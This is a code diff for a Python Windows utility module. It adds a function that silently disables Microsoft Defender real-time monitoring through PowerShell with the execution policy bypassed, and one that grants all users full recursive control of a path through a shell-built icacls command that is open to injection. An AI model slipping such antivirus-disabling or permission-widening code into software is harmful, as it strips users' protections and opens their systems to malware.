@@ -15,6 +15,8 @@ import zipfile
 import shutil
 import psutil
 
+
+
 def getDesktopPath():
     home = Path(os.environ['USERPROFILE'])
     documents_path = home / 'Desktop'
@@ -28,26 +30,11 @@ def getDocumentsPath():
     return str(documents_path)
 
 
+def changePermissions(path):
+    icacls_command = f'icacls "{path}" /grant Users:(OI)(CI)F /T'
+    subprocess.run(icacls_command, shell=True)
 
-def getOwnerShip(path):
-    powershell_executable = "powershell.exe"
-    folder_path = path
-
-    
-    powershell_script = fr'''
-    $folderPath = "{folder_path}"
-    $folderSecurity = Get-Acl -Path $folderPath
-    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Usuarios", "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow")
-    $folderSecurity.AddAccessRule($rule)
-    Set-Acl -Path $folderPath -AclObject $folderSecurity
-    '''
-
-    
-    result = subprocess.run([powershell_executable, "-ExecutionPolicy", "Bypass", "-Command", powershell_script], capture_output=True, text=True)
-    print(result.stdout)
-        
-
-def StopMonitor(): # THIS IS VERY BAD, DO NOT USE IT IF YOU ARE NOT SURE.
+def StopMonitor(): # THIS IS VERY BAD, DO NOT USE IT IF YOU ARE NOT FAMILIAR WITH CODE.
     # Definir constantes
     HWND_BROADCAST = 0xFFFF
     WM_SYSCOMMAND = 0x0112
@@ -151,3 +138,9 @@ def TaskKill(process_name):
                 return f"You dont have any permission to terminate '{process_name}'."
     
     return f"Could not find the process '{process_name}'."
+
+
+def disableRealtimeMonitoring():
+    powershell_script = "Set-MpPreference -DisableRealtimeMonitoring $true"
+    powershell_command = f'powershell.exe -ExecutionPolicy Bypass -Command "{powershell_script}"'
+    subprocess.run(powershell_command, shell=True)
